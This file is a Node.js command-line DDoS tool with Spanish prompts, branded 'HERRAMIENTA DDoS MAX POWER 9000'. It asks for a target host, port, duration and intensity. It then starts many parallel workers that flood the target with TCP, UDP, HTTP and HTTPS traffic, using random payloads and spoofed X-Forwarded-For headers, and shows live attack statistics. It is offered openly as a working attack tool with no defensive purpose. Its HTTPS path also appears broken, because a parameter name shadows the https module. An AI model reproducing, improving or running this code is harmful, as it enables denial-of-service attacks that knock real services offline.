#!/usr/bin/env node
'use strict';

const net = require('net');
const dgram = require('dgram');
const crypto = require('crypto');
const readline = require('readline');
const http = require('http');
const https = require('https');
const cluster = require('cluster');
const os = require('os');
const tls = require('tls');
const zlib = require('zlib');
const dns = require('dns').promises;

const colors = {
    title: "\x1b[1;33m", 
    prompt: "\x1b[1;32m",
    error: "\x1b[1;31m",
    success: "\x1b[1;92m",
    warning: "\x1b[1;93m",
    info: "\x1b[1;96m",
    stat: "\x1b[1;97m",
    highlight: "\x1b[1;95m",
    cyber: "\x1b[38;5;129m",
    reset: "\x1b[0m"
};

const BANNER = `
${colors.cyber}╔═╗╔╦╗╔═╗╦  ╔═╗╦═╗╔═╗╔═╗╔═╗╦═╗
╠═╣║║║║ ║║  ║╣ ╠╦╝╠═╣║  ║╣ ╠╦╝
╩ ╩╩ ╩╚═╝╩═╝╚═╝╩╚═╩ ╩╚═╝╚═╝╩╚═
${colors.title}    HERRAMIENTA DDoS MAX POWER 9000${colors.reset}
`;

class CyberAttackSystem {
    constructor() {
        this.stats = {
            packets: 0,
            success: 0,
            failed: 0,
            bandwidth: 0,
            startTime: Date.now(),
            methods: {}
        };
        this.workers = [];
        this.active = false;
        this.rl = readline.createInterface({
            input: process.stdin,
            output: process.stdout
        });
    }

    async init() {
        console.clear();
        console.log(BANNER);
        
        this.target = await this.getInput("Objetivo (IP/dominio): ");
        this.port = await this.getNumber("Puerto (1-65535): ", 1, 65535);
        this.duration = await this.getNumber("Duración (segundos): ", 10, 3600);
        this.intensity = await this.selectIntensity();
        this.methods = await this.selectMethods();
        
        await this.resolveTarget();
        await this.startCyberAttack();
    }

    async getInput(prompt) {
        return new Promise(resolve => {
            this.rl.question(`${colors.prompt}${prompt}${colors.reset}`, resolve);
        });
    }

    async getNumber(prompt, min, max) {
        while (true) {
            const input = await this.getInput(prompt);
            const num = parseInt(input);
            if (!isNaN(num) && num >= min && num <= max) return num;
            console.log(`${colors.error}Valor inválido. Use entre ${min}-${max}${colors.reset}`);
        }
    }

    async selectIntensity() {
        console.log(`${colors.info}\nNiveles de intensidad:`);
        const levels = [
            "Moderada   (100ms)",
            "Agresiva   (10ms)",
            "Extrema    (1ms)",
            "NUCLEAR    (0ms)"
        ];
        levels.forEach((l, i) => console.log(` ${i+1}) ${l}`));
        
        const choice = await this.getNumber("Selección (1-4): ", 1, 4);
        return ["Moderada", "Agresiva", "Extrema", "NUCLEAR"][choice-1];
    }

    async selectMethods() {
        console.log(`${colors.info}\nMétodos de ataque:`);
        const methods = [
            "TCP Flood",
            "UDP Flood",
            "HTTP Flood",
            "HTTPS Flood",
            "TODOS (Ataque combinado)"
        ];
        methods.forEach((m, i) => console.log(` ${i+1}) ${m}`));
        
        const choice = await this.getNumber("Selección (1-5): ", 1, 5);
        return choice === 5 ? 
            ["TCP", "UDP", "HTTP", "HTTPS"] : 
            [["TCP", "UDP", "HTTP", "HTTPS"][choice-1]];
    }

    async resolveTarget() {
        try {
            if (!net.isIP(this.target)) {
                const records = await dns.resolve4(this.target);
                this.target = records[0];
                console.log(`${colors.success}Resuelto: ${this.target}${colors.reset}`);
            }
        } catch {
            console.log(`${colors.warning}No se pudo resolver DNS, usando como IP${colors.reset}`);
        }
    }

    getDelay() {
        const delays = { "Moderada": 100, "Agresiva": 10, "Extrema": 1, "NUCLEAR": 0 };
        return delays[this.intensity] || 10;
    }

    generatePayload() {
        const methods = ["GET", "POST", "PUT", "DELETE", "PATCH"];
        const paths = ["/", "/api", "/wp-admin", "/.env", "/config", "/admin"];
        const ua = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
            'AppleWebKit/537.36 (KHTML, like Gecko)',
            'Chrome/118.0.0.0 Safari/537.36'
        ].join(' ');

        const method = methods[Math.floor(Math.random() * methods.length)];
        const path = paths[Math.floor(Math.random() * paths.length)];
        const ip = Array.from({length: 4}, () => Math.floor(Math.random() * 256)).join('.');
        
        return Buffer.from([
            `${method} ${path} HTTP/1.1`,
            `Host: ${this.target}`,
            `User-Agent: ${ua}`,
            `Accept: */*`,
            `X-Forwarded-For: ${ip}`,
            `Connection: keep-alive`,
            `\r\n`
        ].join('\r\n'));
    }

    createTCPWorker() {
        const worker = () => {
            const socket = net.connect(this.port, this.target, () => {
                const payload = crypto.randomBytes(2048);
                const interval = setInterval(() => {
                    try {
                        socket.write(payload);
                        this.updateStats('TCP', payload.length);
                    } catch {
                        this.stats.failed++;
                    }
                }, this.getDelay());
                
                socket.on('error', () => this.stats.failed++);
                socket.on('close', () => clearInterval(interval));
            });
            return socket;
        };
        
        return worker;
    }

    createUDPWorker() {
        const worker = () => {
            const socket = dgram.createSocket('udp4');
            const payload = crypto.randomBytes(1024);
            
            const attack = () => {
                socket.send(payload, this.port, this.target, (err) => {
                    if (err) this.stats.failed++;
                    else this.updateStats('UDP', payload.length);
                    setTimeout(attack, this.getDelay());
                });
            };
            
            attack();
            return socket;
        };
        
        return worker;
    }

    createHTTPWorker(https = false) {
        const worker = () => {
            const protocol = https ? https : http;
            const payload = this.generatePayload();
            
            const attack = () => {
                const req = protocol.request({
                    hostname: this.target,
                    port: this.port,
                    method: 'GET',
                    path: '/?' + crypto.randomBytes(8).toString('hex'),
                    headers: {
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
                        'Accept': '*/*',
                        'Connection': 'keep-alive',
                        'X-Forwarded-For': `${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}`
                    }
                }, () => {
                    this.updateStats(https ? 'HTTPS' : 'HTTP', payload.length);
                });
                
                req.on('error', () => this.stats.failed++);
                req.end();
                setTimeout(attack, this.getDelay());
            };
            
            attack();
            return { destroy: () => {} };
        };
        
        return worker;
    }

    updateStats(method, bytes) {
        this.stats.packets++;
        this.stats.success++;
        this.stats.bandwidth += bytes;
        this.stats.methods[method] = (this.stats.methods[method] || 0) + 1;
    }

    displayStats() {
        const duration = (Date.now() - this.stats.startTime) / 1000;
        const mins = Math.floor(duration / 60);
        const secs = Math.floor(duration % 60);
        const pps = duration > 0 ? (this.stats.packets / duration).toFixed(2) : 0;
        const mb = (this.stats.bandwidth / (1024 * 1024)).toFixed(2);
        
        console.clear();
        console.log(BANNER);
        console.log(`${colors.title}╔══════════════════════════════════════════════════╗`);
        console.log(`║ ${colors.highlight}ATAQUE ACTIVO: ${this.target}:${this.port} (${this.intensity})${colors.title}   ║`);
        console.log(`╠══════════════════════════════════════════════════╣`);
        console.log(`║ ${colors.stat}Duración: ${mins}m ${secs}s | Paq/seg: ${pps}${colors.title}     ║`);
        console.log(`║ ${colors.stat}Tráfico: ${mb} MB | Éxito: ${this.stats.success}${colors.title}    ║`);
        console.log(`║ ${colors.stat}Fallidos: ${this.stats.failed} | Métodos:${colors.title}         ║`);
        
        const methods = Object.entries(this.stats.methods);
        if (methods.length > 0) {
            methods.forEach(([method, count]) => {
                console.log(`║ ${colors.info}${method.padEnd(6)}: ${count.toString().padStart(7)} paquetes${colors.title}  ║`);
            });
        }
        
        console.log(`╚══════════════════════════════════════════════════╝${colors.reset}`);
    }

    async startCyberAttack() {
        console.log(`${colors.warning}\n[!] Iniciando ataque en 3 segundos...${colors.reset}`);
        await new Promise(resolve => setTimeout(resolve, 3000));
        
        const workerTypes = {
            'TCP': this.createTCPWorker(),
            'UDP': this.createUDPWorker(),
            'HTTP': this.createHTTPWorker(false),
            'HTTPS': this.createHTTPWorker(true)
        };
        
        const cores = os.cpus().length;
        const multiplier = this.intensity === 'NUCLEAR' ? 64 : 16;
        const workersPerMethod = cores * multiplier;
        
        this.methods.forEach(method => {
            for (let i = 0; i < workersPerMethod; i++) {
                this.workers.push(workerTypes[method]());
            }
        });
        
        this.active = true;
        this.statsInterval = setInterval(() => this.displayStats(), 1000);
        
        setTimeout(() => {
            this.stopAttack();
            console.log(`${colors.success}\n[+] Ataque completado después de ${this.duration} segundos!${colors.reset}`);
            console.log(`${colors.stat}Paquetes totales: ${this.stats.packets}${colors.reset}`);
            process.exit(0);
        }, this.duration * 1000);
    }

    stopAttack() {
        clearInterval(this.statsInterval);
        this.workers.forEach(worker => {
            if (worker.destroy) worker.destroy();
            if (worker.close) worker.close();
        });
        this.active = false;
    }
}

process.on('SIGINT', () => {
    console.log(`\n${colors.error}[!] Ataque detenido por el usuario${colors.reset}`);
    process.exit(0);
});

new CyberAttackSystem().init().catch(err => {
    console.error(`${colors.error}[!] Error crítico: ${err.message}${colors.reset}`);
    process.exit(1);
});